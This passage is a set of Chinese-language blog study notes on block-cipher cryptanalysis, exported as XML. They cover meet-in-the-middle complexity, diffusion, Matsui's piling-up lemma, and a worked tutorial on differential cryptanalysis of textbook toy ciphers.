<p>状态 $S$ 可以从两个方向计算得来，即 $S=F_{1}(P,K_1) = F_2^{-1}(C,K_2)$ ，其中 $F_1,F_2$ 分别是前向和后向的（部分）加密函数</p>
<p>但并不是仅有 $K_1,K_2$ 就可以从明文加密到密文，还有剩余没有用上的密钥 $K_3$ ，所以有 $\left|\mathcal{K}_{(1)}\right|+\left|\mathcal{K}_{(2)}\right|+\left|\mathcal{K}_{(3)}\right|=R \cdot \ell$ </p>
<p>对于此处的 $K_1,K_2$ ，需要能够保证 $F_{1}(P,K_1) = F_2^{-1}(C,K_2)$ 的计算是独立的；</p>
</li>
<li><p>将 $min(K_1,K_2)$ 得到的 $(P/C,S)$ 拿来存表，而另一部分用来做匹配，如果能够在状态 $S$ 匹配到，即 $S=F_{1}(P,K_1) = F_2^{-1}(C,K_2)$ ，则将使用的密钥 $K_1,K_2$ 加入候选密钥表；</p>
</li>
<li><p>考虑到并行操作，可以对多个明密文对并行操作进行步骤 2.</p>
</li>
</ol>
<p><strong>Test Stage</strong></p>
<p>同样的，使用不同明密文对测试，但测试的不是是否能够从明文加密到密文，因为整个过程没有考虑 $K_3$ ，而是测试使用不同的明密文能否找到状态 $S$ 的匹配 ？ 是这样吗？？</p>
<p><strong>NOTE</strong></p>
<ol>
<li><p>在步骤 2. 有 $2^{-s}$ 的概率在状态 $S$ 匹配到，而总可能密钥数为 $2^{R<em>l}$ 所以留下的候选密钥为 $2^{R</em>l-s}$ 个，而并行使用 N 个明密文对留下的候选密钥就为  $2^{R<em>l-N</em>s}$ 个；</p>
</li>
<li><p>这里可以并行使用的明密文对数量 N 为，需要有一定的限制：</p>
<p>$2^{R<em>l-N</em>s} \leq 2^{R*l-(|K_1|+|K_2|)}$ 即 $N\leq(|K_1|+|K_2|)/s$，如果不满足，则意味着使用 $2^{|K_1|+|K_2|}$ 种密钥筛掉了超过大于 $2^{|K_1|+|K_2|}$ 个密钥，这是不合理的；</p>
</li>
</ol>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：选 $|K_1|,|K_2|$ 更大的用来做匹配，对 N 个明密文对，就需要 $\max \left(2^{\left|\mathcal{K}_{(1)}\right|}, 2^{\left|\mathcal{K}_{(2)}\right|}\right) \times N$ 的计算，而对剩余的密钥 $K_3$ 就需要穷举，需要 $2^{R \cdot \ell-N \cdot s}$ 的计算，所以总时间复杂度为：</li>
</ul>
<script type="math/tex; mode=display">
T_n = C_{c o m p}=\max \left(2^{\left|\mathcal{K}_{(1)}\right|}, 2^{\left|\mathcal{K}_{(2)}\right|}\right) \times N+2^{R \cdot \ell-N \cdot s} .</script><ul>
<li>空间复杂度：选 $|K_1|,|K_2|$ 更小的用来建表，对 N 个明密文对，总空间复杂度为：</li>
</ul>
<script type="math/tex; mode=display">
S_n = \min \left(2^{\left|\mathcal{K}_{(1)}\right|}, 2^{\left|\mathcal{K}_{(2)}\right|} \mid\right) \times N</script><ul>
<li>数据复杂度：并行 N 个不同的明密文对，在测试阶段，留下密钥 $R<em>l-N</em>s$ bits，因为分组长度为 n ，所以每个新的明密文对可以筛掉 n bits（<strong>注意</strong>这个过程：$P \rightarrow E_k \rightarrow C$ ，这里的 $_k$ 会遍历所有留下的候选密钥，而理论上会有 n 个被筛掉）所以需要进行  $\lceil(R \cdot \ell-N \cdot s) / n\rceil$ 次筛查，数据复杂度为：</li>
</ul>
<script type="math/tex; mode=display">
D_n = \max (N,\lceil(R \cdot \ell-N \cdot s) / n\rceil)</script>]]></content>
      <categories>
        <category>Cryptanalysis</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Diffusion Basic</title>
    <url>/2022/05/26/Cryptanalysis/Basic-Diffusion/</url>
    <content><![CDATA[<p>香农提出了密码设计的两种基本方法即 混淆和扩散。</p>
<p>分组密码系统包括 线性部分 和 非线性部分，其对应功能分别是 扩散和混淆。</p>
<p>扩散性往往由线性函数提供，如 rotation ，shift ，或更复杂的 MDS matrix（但其本质也是 rotation and shift）。</p>
<p>在研究扩散性时，如果往其最基本单元考虑：</p>
<p>线性运算时一般是 位切片操作，即对每一个 bit 进行运算。那么总体来看就是一个面向 GPU 友好型的 <a href="https://baike.baidu.com/item/%E5%8D%95%E6%8C%87%E4%BB%A4%E6%B5%81%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%B5%81/257612">SIMD</a> 操作 ，对一个 bit 的操作不会影响到其他 bits，显然这是不能够满足扩散性的，那么就需要一些 rotation，shift… 来将 bit 打散，使其能够更多的参与到非线性运算。</p>
<p>由于 扩散主要是用来使用明文和密文的关系变得尽可能的复杂，明文中任何一点小更动都会使得密文有很大的差异，即达到雪崩效应。</p>
<blockquote>
<p>雪崩效应：对于密码而言，要求输入位的 1 bit 变化导致每个输出位 bit 有 50% 的概率发生反转</p>
</blockquote>
<p><a href="https://crypto.stackexchange.com/questions/19000/shannon-confusion-and-diffusion-concept/44659#44659">The job of the linear diffusion layer is to ensure that each successive input to the non-linear function consists of a balanced and maximum number of super-positioned input bits.</a></p>
<p>而验证扩散性是否能够尽可能地达到使密码系统安全的办法，除建立相关性方程，利用如 Mathmatica 等工具来搜索之外，可能还需要考虑由于扩散不全而造成的分支代数次数低，差分线性分析等等。</p>
]]></content>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>piling-up lemma</title>
    <url>/2022/06/14/Cryptanalysis/Piling-up%20lemmA/</url>
    <content><![CDATA[<h1 id="堆积引理-Piling-up-lemmA"><a href="#堆积引理-Piling-up-lemmA" class="headerlink" title="堆积引理 (Piling-up lemmA)"></a>堆积引理 (Piling-up lemmA)</h1><p>1993 年，松井先生提出线性密码分析的一个强有力工具—堆积引理，用于计算线性偏差，能够公式化的将多位线性运算的线性偏差表示出来。</p>
<p>从简单的例子开始：</p>
<p>随机布尔变量：$X_1,X_2$ ，取到 0 或 1 的概率为：</p>
<script type="math/tex; mode=display">
\begin{array}{l}
P_{r}\left(X_{1}=i\right)=\left\{\begin{array}{ll}
p_{1}, & i=0 \\
1-p_{1}, & i=1
\end{array}\right. \\
P_{r}\left(X_{2}=i\right)=\left\{\begin{array}{ll}
p_{2}, & i=0 \\
1-p_{2}, & i=1
\end{array}\right.
\end{array}</script><p>如果 $X_1,X_2$ 分别为一个密码系统的输入输出，在理想情况下，概率应该为：</p>
<script type="math/tex; mode=display">
p_1=p_2=\frac{1}{2}</script><p>现实情况往往相比理想情况会有一定的偏差 $\varepsilon\ (-\frac{1}{2}&lt;\varepsilon&lt;\frac{1}{2})$，称为线性偏差，即：</p>
<script type="math/tex; mode=display">
p_1=\frac{1}{2}+\varepsilon_1\\
p_2=\frac{1}{2}+\varepsilon_2</script><p>如果 $X_1,X_2$ <strong>相互独立</strong>，同时对 $X_1,X_2$ 取值，会得到：</p>
<script type="math/tex; mode=display">
P_{r}\left(X_{1}=i, X_{2}=j\right)=\left\{\begin{array}{ll}
p_{1} p_{2}, & i=0, j=0 \\
p_{1}\left(1-p_{2}\right), & i=0, j=1 \\
\left(1-p_{1}\right) p_{2}, & i=1, j=0 \\
\left(1-p_{1}\right)\left(1-p_{2}\right), & i=1, j=1
\end{array}\right.</script><p>假设需要求 $P_r(X_1\oplus X_2=0)\ i.e. P_r(X_1=X_2)$ ，通过上面很容易得到：</p>
<script type="math/tex; mode=display">
P_r(X_1\oplus X_2=0)=P_r(X_1=X_2)\\=p_1p_2+(1-p_1)(1-p_2)\\=1-p_1-p_2+2p_1p_2</script><p>带入上面现实情况的偏差，会得到：</p>
<script type="math/tex; mode=display">
P_r(X_1\oplus X_2=0)=P_r(X_1=X_2)\\=\frac{1}{2}+2\varepsilon_1\varepsilon_2</script><p>再考虑理想情况下，$P_r(X_1\oplus X_2=0)=P_r(X_1=X_2)$ 应该为 $\frac{1}{2}$ ，但现实情况仍然是存在偏差 $2\varepsilon_1\varepsilon_2$ ，也就是说，<strong>2个布尔变量相等的概率，在现实情况下与理想情况的偏差为 2 倍的单个布尔变量偏差乘积</strong> ，那么 3 个布尔变量呢？</p>
<p>假设有 $X_1,X_2,X_3$ ，偏差分别为 $\varepsilon_1,\varepsilon_2,\varepsilon_3$ ，在理想情况下三者模 2 加的结果为 0 的概率为 $\frac{1}{2}$  ，同样的带入偏差计算会得到结果 $\frac{1}{2}+2^2\varepsilon_1\varepsilon_2\varepsilon_3$，即三者XOR得到 0 的偏差为 $2^2\varepsilon_1\varepsilon_2\varepsilon_3$ 。</p>
<p>4 个布尔变量：$X_1,X_2,X_3,X_4$ ，可以得到偏差为 $2^3\varepsilon_1\varepsilon_2\varepsilon_3\varepsilon_4$</p>
<p>推广到更一般的情况：也就是堆积引理的公式化描述：</p>
<script type="math/tex; mode=display">
P_r(X_1 \oplus X_2 \oplus...\oplus X_n=0)=\frac{1}{2} + 2^{n-1}\prod_{i=1}^{n}\varepsilon_i</script><p>可以发现，由于 $\prod\varepsilon$ 的降低速率远大于 $2^{n-1}$ 的增长速率，所以位数越多，偏差越小。</p>
<p>由以上也可以推出另一个关系：</p>
<script type="math/tex; mode=display">
\begin{array}{l}
\operatorname{Pr}\left(X_{1} \oplus X_{2}=0\right)=1 / 2+\varepsilon_{1,2} \\
\operatorname{Pr}\left(X_{2} \oplus X_{3}=0\right)=1 / 2+\varepsilon_{2,3} \\
\Longrightarrow\\
\operatorname{Pr}\left(X_{1} \oplus X_{3}=0\right)=1 / 2+\varepsilon_{1,3} \\
\varepsilon_{1,3}=2\varepsilon_{1,2}\varepsilon_{2,3}
\end{array} \text {, }\\</script><p>参考：</p>
<p>Matsui, M. (1994). Linear Cryptanalysis Method for DES Cipher. In: Helleseth, T. (eds) Advances in Cryptology — EUROCRYPT ’93. EUROCRYPT 1993. Lecture Notes in Computer Science, vol 765. Springer, Berlin, Heidelberg. <a href="https://doi.org/10.1007/3-540-48285-7_33">https://doi.org/10.1007/3-540-48285-7_33</a></p>
<p><a href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%90%86%E8%AE%BA/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90/SPN%E7%BA%BF%E6%80%A7%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90.html">st0n3’s blog</a></p>
]]></content>
      <categories>
        <category>Cryptanalysis</category>
      </categories>
      <tags>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>有限域上的运算</title>
    <url>/2022/05/27/Cryptanalysis/%E6%9C%89%E9%99%90%E5%9F%9F%E4%B8%8A%E7%9A%84%E8%BF%90%E7%AE%97/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Differential Cryptanalysis</title>
    <url>/2022/05/25/Cryptanalysis/%E5%B7%AE%E5%88%86%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p><em>有些地方没渲染出来，以后注意</em></p>
<h1 id="Differential-Cryptanalysis"><a href="#Differential-Cryptanalysis" class="headerlink" title="Differential Cryptanalysis"></a>Differential Cryptanalysis</h1><h3 id="DC-to-ToyCipher"><a href="#DC-to-ToyCipher" class="headerlink" title="DC to ToyCipher"></a>DC to ToyCipher</h3><center>
  <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650188144391/B9FB9D37BDF15A699BC071CE49BAEA53" width="30%">
</center>

<h4 id="CIPHER-1"><a href="#CIPHER-1" class="headerlink" title="CIPHER-1"></a>CIPHER-1</h4><p>以一个$toycipher$为例：$CIPHER-1$，其中，$S[·]$ 表示一个公开的 $S-Box$ 置换（可逆)</p>
  <center>
  <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650189319128/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
  </center>

<p>在已知明文 $m_{0} \; m_{1}$ ，密文 $c_{0}\;c_{1}$ 的情况下（已知明文攻击），加密过程如下：</p>
<p>(已知：$m_{0} \; m_{1}\; c_{0}\;c_{1} ;$<br>未知：$k_{0}\;k_{1}\;u\;v)$</p>
<center>
  <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650186751354/D2B5CA33BD970F64A6301FA75AE2EB22" width="60%">
  </center>

<p>由于两次加密使用的是相同的密钥 $k_{0}$和 $k_{1}$ ，所以对明文以密码最常用操作( $\bigoplus$ )做差分得到：</p>
  <center>
    <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650186863109/D2B5CA33BD970F64A6301FA75AE2EB22" width="60%">
  </center>

<p>即，明文$m_{0} \; m_{1}$差分 == 中间状态 $u_{0}, u_{1}$ 的差分，消去了密钥 $k_{0}$ 的影响；</p>
<p>所以，跳过 $k_{0}$ 的影响，枚举 $k_{1}$ 的候选值，记 $t$，当$ t$ 满足 </p>
<script type="math/tex; mode=display">
\textcolor{red}{S^{-1}  [ t \bigoplus c_{0}] \bigoplus S^{-1} [ t \bigoplus c_{0}] == m_{0} \bigoplus m_{1}}</script><p>时，记 $1$ 次有效的 $t$ 计数，当 $t$ 计数足够多时，则认为 $t$ 有很大可能就是$k_{1}$ ，只需验证即可。</p>
<p>$ Conclusion\underline{ }\;P_1: $</p>
<ol>
<li>即使中间数据未知，仍然可以通过寻找已知数据的差异来断定中间数据的差异；</li>
<li>差分分析的一种方法(init) ，通过寻找确定的一部分中间状态数据，穷举另一部分未知数据来恢复密钥。</li>
</ol>
<p>下面是一个具体的分析的例子:</p>
  <center>
 <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650189084066/D2B5CA33BD970F64A6301FA75AE2EB22">
  </center>

  <center>
  <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650189139457/D2B5CA33BD970F64A6301FA75AE2EB22">
  </center>


<p>简单解释一下以上例子的过程：（已知明文攻击）</p>
<ol>
<li><p>选择两对明密文，根据上面推出的公式：中间值差分$(u_{0}\bigoplus u_1)==$ 明文差分 $(m_{0} \bigoplus m_{1})$，计算出$u_{0} \bigoplus u_{1}$的值;</p>
</li>
<li><p>计算出$S[·]$的逆$S^{-1}[·]=R[·]$，用来计算核心推导式;</p>
</li>
<li><p>穷举所有的 $k_{1}= t$,根据式：$S^{-1}  [ t \bigoplus c_{0}] \bigoplus S^{-1} [ t \bigoplus c_{0}]$计算出中间值差分;</p>
</li>
<li><p>将3.中的结果与2.中的结果匹配，对可能使等式$S^{-1}  [ t \bigoplus c_{0}] \bigoplus S^{-1} [ t \bigoplus c_{0}] == m_{0} \bigoplus m_{1}$成立的t计数（或存到一个集合中）需要注意使成立的t值可能<font color = purple>不唯一</font>，这就涉及到差分概率，后面再说;</p>
</li>
<li><p>为了找出唯一的$t=k_{1}$，需要更多的明密文对来重复上述1.2.3.4.过程;</p>
</li>
<li><p>将多个明密文对产生的可能$t=k_{1}$结果取交集，直到得到最后的唯一的结果，即可以断定其为正确的$k_{1}$</p>
</li>
</ol>
  <center>
<br>
  <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650203196847/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
  <br>
  </center>

<h4 id="CIPHER-2"><a href="#CIPHER-2" class="headerlink" title="CIPHER-2"></a>CIPHER-2</h4><p>下面考虑一个更复杂的例子，假设$Cipher-2$有两个$S$盒及$3$个密钥：</p>
<center>
  <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650203999365/757C75C2BC7E2D8D9493B7FD3FD6BF1F" width="80%">
</center>

<p>明显，在以上例子中，虽然有关系 $m_{0} \bigoplus m_{1}$，但无法通过$S[·]$的逆找到中间值$w$和$v$，因为再往前传递数据的过程中，$S[·]$会消去已部分差分关系（当然，不是完全消去）</p>
<p>那么，就需要更进一步的考虑$S$盒对该差分传递的影响</p>
<p>下面做一个小测试，考虑两个相同$S$盒的输出差分:<br>取i,j分别为进入两个S盒的数据，且i是j的补，即$j=i \bigoplus f$，则有下表$<br></p>
<blockquote>
<p><strong>#小知识：二进制数据$i$的补$==i\bigoplus F_{16} ==i\bigoplus \vec{1}$</strong></p>
</blockquote>
<p>按照$CIPHER-1$的办法无法获取中间值$v$和$w$，因为经过了非线性的$S$盒，$\bigoplus $的差分无法被传递下去；<br>所以选定明文 $i$，和通过明文 $i$ 可以推出的明文 $j$ ，并将其分别进入 $S$ 盒，拿到其输出 $S$ 盒的差分，建立下表：</p>
<center>
  <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650205129825/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
</center>


<p>通过上面发现，在第五列，$d$ 出现的频率更高   ，下面给出以上由 $i$ 到 $j$ 到 $S[i] \bigoplus S[j]$ 的推导过程：</p>
<script type="math/tex; mode=display">
i(i.e. message\;or\;plaintext) \rightarrow i \bigoplus F = S[i] \bigoplus S[j]</script><p>所以，我们只需要有一个明文 $i$ 即可；</p>
<p>根据对 $CIPHER-1$ 的攻击可以知道，$m_{0}\bigoplus m_{1} == u_{0} \bigoplus u_{1} == F$,所以有：*当两个异或等于 $ F $ 的值分别进入该 $ S $ 盒，会有$ \frac{10}{16} $的概率得到输出差分 $ d$ ；</p>
<p>同时，通过猜测$ k_{2} $可以得到 $w$ 位置的差分，而 $w$ 位置的差分又等于 $v$ 位置的差分。</p>
<p><strong>所以得到结论：</strong></p>
<p>通过选择两个输入差分为 F 的明文产生密文（并不是选择明文攻击），猜测 $k_{2}$ 从反向在中间进行对比，如果差分数据十分随机，则猜测的 $k_{2}$ 不对，如果猜测 $k_{2}$ 使得在中间 $v_{0}\bigoplus v_{1}$ 为 $d$，则很大可能猜测的 $k_{2}$ 正确。</p>
<p>那么更进一步，对任何一对”选择”的明密文，猜测 $k_{2}$ ，并将所有 $k_{2}$ 的猜测记在$hash$表中，如果 $k_{2}$ 使得中间的差分 $ v_{0}\bigoplus v_{1} = $差分分布表中频率出现最高的数据（如 $Table\;6.1$ 的 $d$），则将该$hash$表中对于的 $k_{2}$ 的位置计数 $+1$.(*逆向推 $k_{2}$ 的过程中，正确的 $k_{2}$ 将会使中间值差分出现的频率远高于其他值出现的频率，如上图 $v_{0} \bigoplus v_{1}=d$ 概率为 $ \frac{10}{16} $,而其他为$ \frac{1}{16} $.</p>
<p>以上的寻找输入差分 $d_{in}$ 及其经过两个 $S-Box$ 之后的输出差分 $d_{out}$ 的值可以建一个差分表 $\textcolor{red}{DDT}$  ,如下：</p>
<p>从下图可以看出，当输入差分为$f$时，输出差分为$d$出现的频率最高次数为10，所以选择差分 $f$ 从 $plaintext$ 注入，获得一条差分概率最大的路径，概率为$\frac{10}{16}$,路径为$f\rightarrow d$. </p>
<p><img src="https://uploadfiles.nowcoder.com/images/20220419/629760107_1650360923811/D2B5CA33BD970F64A6301FA75AE2EB22" alt="img"></p>
<p>对 $CIPHER-2$ 的分析让我们发现了 $S[·]$ 的一些规律，比如：</p>
<ul>
<li>如果两对差分输入位上均不同，如 $0001\;and\;1110$，观察上表的 $1\;and\;e$ ，输出差分在各位也均不同；</li>
<li>在所有位位置不同的十对输入将产生除了第二个最低有效位位置之外的所有不同的输出对；</li>
<li>$and\;so\;on\;and\;so\;forth$</li>
</ul>
<p>那么，如果一对输入输出差分$(\alpha,\beta)$，即输入差分 $\alpha$ 通过 $S[·]$ 可以得到输出差分 $\beta$ ,则称该过程为通过操作 $S[·]$ 的差分特征 $ (differential) \;characteristic\;across\;the\;operation\;S[⋅]$ 记作$\alpha\;\stackrel{S[·]}{\rightarrow}\;\beta$ ,一个特征成立就有与其对应的概率如 $f\;\stackrel{S[·]}{\rightarrow}\;b$ 的概率为$\frac{10}{16}$.</p>
<h3 id="DC-using-Characteristic"><a href="#DC-using-Characteristic" class="headerlink" title="DC using Characteristic"></a>DC using Characteristic</h3><h4 id="CIPHER-3"><a href="#CIPHER-3" class="headerlink" title="CIPHER-3"></a>CIPHER-3</h4><p>有了上面的规律，可以考虑一个更加复杂的$ToyCipher$：$CIPGERTHREE$在$CIPHER-2$的基础上，又多加了一个$S[·]$及一个密钥$k_3$</p>
<center>
<img src="https://uploadfiles.nowcoder.com/images/20220418/629760107_1650291467544/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
</center>

<p>有了对$CIPHER-2$的分析方法，对$CIPHER-3$分析就容易理解多了：如果考虑通过一个$S[·]$，则给定差分 $f$ 会得到差分 $d$ 的概率时 $\frac{10}{16}$；那么，考虑差分继续往后传播，到第二个$S[·]$，通过查表 $Table 6.2$ 可以得知，概率最高的是特征 $d\;\stackrel{S[·]}{\rightarrow}\;c$，概率为 $\frac{6}{16}$，也就是说，如果我们希望能够通过”猜密钥”的方式（或者是枚举）得到密钥 $k_3$ ，就需要经过两个 $S[·]$ ，而带来的影响是，差分概率降低（<em>我们选取的是差分概率最高的一条特征路径）。很自然的，我们把通过两个$S[·]$的差分特征概率乘起来 $\frac{10}{16}  </em> \frac{6}{16}=\frac{15}{64}$，也就是说，我们猜出正确的$k_3$的概率是$\frac{15}{64}$,但这也是很大的降低了噪声对我们猜测密钥的影响，因为随机猜测密钥的。</p>
<h4 id="CIPHER-4"><a href="#CIPHER-4" class="headerlink" title="CIPHER-4"></a>CIPHER-4</h4><p>$CIPHER-4$已经十分类似我们现在使用的分组密码（见 $AES$ 算法 $Rijndael$）：使用 $r$ 轮加密，对 $16-bit\;block$ 操作，所有的 $r+1$ 轮的密钥都随机均匀选取，每一轮包含结构 $S[·]\;and\;P[·]$ （都可逆）见下图：</p>
<p><em>其中，每一轮的输入为 $16-bit$ ，被分为 $4 </em> 4-bit$ 的四个半字节放入 $4 <em> S[·]$ 和 $P[·]$ 中运算，也就是说 $S[·]\;and\;P[·]$ 都是在 $\{0,1\}^4\;\rightarrow(0,f)$ 上的置换</em></p>
<p>4 轮的 $CIPHER-4$ 实现了充分的扩散（雪崩），这得益于$P[·]$的设计；</p>
<p>除 $S[·]$ 外，其余运算对二进制上的加法 $\bigoplus$ 均是线性的，$P[·]$ 运算可以用一个线性的矩阵表示；</p>
<center>
    <img src="https://uploadfiles.nowcoder.com/images/20220419/629760107_1650357183268/D2B5CA33BD970F64A6301FA75AE2EB22" width = "80%">
</center>
<center>
    <img src="https://uploadfiles.nowcoder.com/images/20220419/629760107_1650357308008/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
</center>

<p>下面，考虑对$CIPHER-4$分析，继承对$CIPHER-3$的分析方法，寻找前 $r-1$ 轮的差分特征，猜第 $r$ 轮使用的密钥 $k_r$，由于有 4 个 $S[·]$ 所以将差分特征表示为：</p>
<script type="math/tex; mode=display">
(\alpha_1,\alpha_2,\alpha_3,\alpha_4)\stackrel{S}{\rightarrow}(\beta_1,\beta_2,\beta_3,\beta_4)</script><p>还有一个 $P[·]$ 作用在 $S[·]$ 之后，而 $P[·]$ 不会影响差分值，只会影响其在下一轮出现的位置， $P[·]$的作用是将差分传播到尽可能多的  $S[·]$ 中，将 $P[·]$过程表示为：</p>
<script type="math/tex; mode=display">
(\beta_1,\beta_2,\beta_3,\beta_4)\stackrel{P}{\rightarrow}(\gamma_1,\gamma_2,\gamma_3,\gamma_4)</script><p>所以，$\beta_1||\beta_2||\beta_3||\beta_4$ 就表示输入差分经 $S[·]$ 之后的输出差分，$\gamma_1||\gamma_2||\gamma_3||\gamma_4$ 表示输出差分经 $P[·]$之后该轮最后的输出差分，所以一轮的差分总体表示为：</p>
<script type="math/tex; mode=display">
(\alpha_1,\alpha_2,\alpha_3,\alpha_4)\stackrel{\mathcal{R}}{\rightarrow}(\gamma_1,\gamma_2,\gamma_3,\gamma_4)</script><p>通过表$Table\;6.2$ 可以发现，如果输入 $S[·]$ 的差分为 0，则输出差分也为 0 ，所以对于 $16-bit\;block$，可以以没半个字节为单位，构造只在一位（一个 $S[·]$ 输入差分）为非零值的数据。当然，这在分析上是允许的，但变成了*选择明文攻击，因为明文是我们自己构造的。在考虑$S[·]$的活跃性时，相当于构造只有一个$S[·]$活跃的轮。构造的输入差分例如$(0,0,1,0)$，每一个位置进入一个$S[·]$，那么至少在第一轮只有一个$S[·]$的输出会存在差分。</p>
<p>再考虑到前面对$CIPHER-1,CIPHER-2$分析的时候，得到一个$S[·]$ 存在最大的差分特征 $f\;\stackrel{S[·]}{\rightarrow}\;b$ ，概率为$\frac{10}{16}$，所以将输入差分令为$(0,0,0,f)$，那么对第一轮，就只有第四个$S[·]$ 存在差分，描述经过一轮差分的传递：</p>
<script type="math/tex; mode=display">
(0,0,0,f)\stackrel{S}{\rightarrow}(0,0,0,d)</script><p>但是，一个好的$P[·]$置换，会将差分传递到下一轮尽量多的$S[·]$，比如采用 $MDS$ 矩阵的$P[·]$，见<a href="https://blog.nowcoder.net/n/0fbe211a2ff74f00bb960825947903ae">$Matrix\ Branch\;and\;MDS$</a>。即使不考虑$P[·]$有足够好的扩散性能，其也可以将差分特征扩散，比如：</p>
<script type="math/tex; mode=display">
(0,0,0,d)\stackrel{P}{\rightarrow}(1,1,0,1)</script><p>所以上面整个过程描述下来就是：</p>
<script type="math/tex; mode=display">
(0,0,0,f)\stackrel{\mathcal{R}}{\rightarrow}(1,1,0,1)</script><p>因为这是整个一轮，所以其整个过程的概率就是$\frac{10}{16}$.</p>
<p>继续考虑第二轮，通过表 $Table\;6.2$ 可以看到，$(1,1,0,1)$ 存在差分的三位再经过一次 $S[·]$ 的输出差分特征以概率$(\frac{6}{16})^3$存在（*因为每个输入差分1到输出差分2的特征概率都是$\frac{6}{16}$，所以将其概率相乘才是总体输出差分为$(2,2,0,2)$的概率）且差分特征描述为：</p>
<script type="math/tex; mode=display">
(1,1,0,1)\stackrel{\mathcal{S}}{\rightarrow}(2,2,0,2)</script><p>经过一次 $P[·]$ 置换，以概率 1 获得差分$(0,0,d,0)$：</p>
<center>
    <img src="https://uploadfiles.nowcoder.com/images/20220419/629760107_1650375507202/0F3B05EDC47049CEB882AF3A187D174E" width="80%">
</center>

<script type="math/tex; mode=display">
(2,2,0,2)\stackrel{\mathcal{S}}{\rightarrow}(0,0,d,0)</script><p>所以，两轮的差分传递描述为：</p>
<script type="math/tex; mode=display">
\begin{align}
(0,0,0,f)\stackrel{\mathcal{R_1}}{\rightarrow}(1,1,0,1)\stackrel{\mathcal{R_2}}{\rightarrow}(0,0,d,0)
\end{align}
\tag{inherited\;path}</script><p>计算总概率，第一轮概率是 $\frac{10}{16}$，第二轮概率是$(\frac{6}{16})^3$，乘在一起得到 $\frac{10}{16} * (\frac{6}{16})^3=\frac{135}{4096}$，也就意味着我们在枚举密钥时，已经失去了对于穷举的优势。当然，对于这个例子可能不十分合适去解释，因为其用来 4 个 $S[·]$ ，那就假设每个$S[·]$ 前面使用的都是相同密钥，密钥是 4 位 2 进制，也就共有 $2^4=16$种可能。很显然 $\frac{135}{4096}$ 要小于 $\frac{1}{16}$ ，所以对两轮$CIPHER-4$的差分分析失去了消除噪声的优势。</p>
<p>考虑一下原因，很自然的想到，$P[·]$ 是影响该结构差分传播的一个大问题，在第 2 轮时由于差分特征被 $P[·]$ 扩散开，所有就产生了三条路径，而计算时需要将三条路径的概率相乘，也就造成了经过两轮后差分特征概率变得如此低。同时，在第一轮输入开始就以我们预像的最大差分概率来构造差分，并将其注入明文来构造明文对，这种方法可能并不会给我们带来最佳差分路径（概率最高），因为其在前面 $CIPHER-1,2,3$ 中使用的差分特征仅仅对 $S[·]$ 而这里有 $P[·]$，所有我们应该将 $S[·]\;and\;P[·]$ 一起考虑。给出一个例子：</p>
<script type="math/tex; mode=display">
(0,0,2,0)\stackrel{S}{\rightarrow}(0,0,2,0)\stackrel{P}{\rightarrow}(0,0,2,0)</script><p>可能这是将差分扩散性作为优先级考虑的一种路径，但这条路径的差分特征概率确实比上面一条更高，通过表$Table\;6.2$发现，差分特征概率为$\frac{6}{16}$,为一轮的差分特征概率，同时为每一轮的差分特征概率。所有经过 4 轮之后，得到概率为 $(\frac{6}{16})^4$ 的差分特征路径：</p>
<script type="math/tex; mode=display">
\begin{align}
(0,0,2,0)\stackrel{\mathcal{R_1}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_2}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_3}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_4}}{\rightarrow}
(0,0,2,0)
\end{align}
\tag{better\;path}</script><p>以上过程也可以通过寻找满足要求的明密文对来描述，如果要求选择的明密文对对满足在每一轮差分都为一定值,如上面的 $(0,0,2,0)$ ，则在随机密钥的情况下（其实对于我们举例的密码，密钥并没有影响到差分，但为保证其随机性，还是随机选择密钥，选择 5 个种子密钥，没有经过密钥编排，用作 4 轮，每一轮使用一个 4 位 2 进制作为密钥参与密码运算），统计对数并计算平均值，然后与总可能差分数量 $2^16=65536$ 作比，可以得到与计算特征概率几乎相同的结果：</p>
<center>
    <img src="https://uploadfiles.nowcoder.com/images/20220420/629760107_1650442599859/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
</center>

<p>来比较以下，</p>
<ul>
<li>$better\;path$ 的差分特征概率：每一轮的都是 $\frac{6}{16}$ 所有4轮之后概率为 $(\frac{6}{16})^4$</li>
<li>$inherited\;path$ 的差分特征概率：$\frac{10}{16}<em>(\frac{6}{10})^3</em>\frac{6}{10}*\frac{6}{10}$</li>
</ul>
<script type="math/tex; mode=display">
\begin{align}
(0,0,0,f)\stackrel{\mathcal{R_1}}{\rightarrow}(1,1,0,1)\stackrel{\mathcal{R_2}}{\rightarrow}(0,0,d,0)\stackrel{\mathcal{R_3}}{\rightarrow}(0,0,c,0)\stackrel{\mathcal{R_4}}{\rightarrow}(e,0,0,0)
\end{align}
